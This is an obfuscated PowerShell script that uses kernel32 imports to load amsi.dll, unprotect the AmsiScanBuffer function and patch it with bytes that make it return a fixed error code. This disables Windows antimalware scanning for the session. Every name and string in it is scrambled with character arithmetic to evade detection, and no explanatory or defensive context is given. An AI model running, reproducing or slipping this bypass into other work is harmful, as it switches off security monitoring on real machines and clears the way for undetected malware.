$IU3W0Njvz = @"
using System;
using System.Runtime.InteropServices;
public class IU3W0Njvz {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr WtUo6hsH9o7, string AMMfANulGHr6DPlN);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr yf_ELcOrkc, UIntPtr kD5onDA58LzJMvw0mG, uint MjamjpOq7E6m6A41, out uint SNH1mLq5Pcz04Wg0h);
}
"@

Add-Type $IU3W0Njvz

$BCM8di = [IU3W0Njvz]::LoadLibrary("$(('âms'+'í.d'+'ll').nOrmALiZE([cHaR]([byTE]0x46)+[cHaR](111)+[CHaR](114+96-96)+[chaR]([ByTE]0x6d)+[CHar](39+29)) -replace [chaR](92*40/40)+[Char]([BYtE]0x70)+[ChaR]([ByTe]0x7b)+[chAR](21+56)+[cHar]([ByTe]0x6e)+[ChAR]([bYTe]0x7d))")
$VHHDJS = [IU3W0Njvz]::GetProcAddress($BCM8di, "$([cHAr](65)+[CHAR](109)+[cHaR]([bytE]0x73)+[CHaR](105*99/99)+[CHAr](83)+[Char]([bytE]0x63)+[ChaR]([BYTE]0x61)+[CHAR]([ByTe]0x6e)+[ChAR]([bYte]0x42)+[chaR](117+23-23)+[chAr](102)+[cHar](102+21-21)+[chaR](59+42)+[CHAr](114*62/62))")
$p = 0
[IU3W0Njvz]::VirtualProtect($VHHDJS, [uint32]5, 0x40, [ref]$p)
$mzCd = "0xB8"
$FFsoxoy7qrPdeHTLu = "0x57"
$xX4GDU8H2Vnkg = "0x00"
$pY9 = "0x07"
$qV3N2_tvX = "0x80"
$ASI3w = "0xC3"
$xDil3OZlWTAOPPwbiBkN = [Byte[]] ($mzCd,$FFsoxoy7qrPdeHTLu,$xX4GDU8H2Vnkg,$pY9,+$qV3N2_tvX,+$ASI3w)
[System.Runtime.InteropServices.Marshal]::Copy($xDil3OZlWTAOPPwbiBkN, 0, $VHHDJS, 6)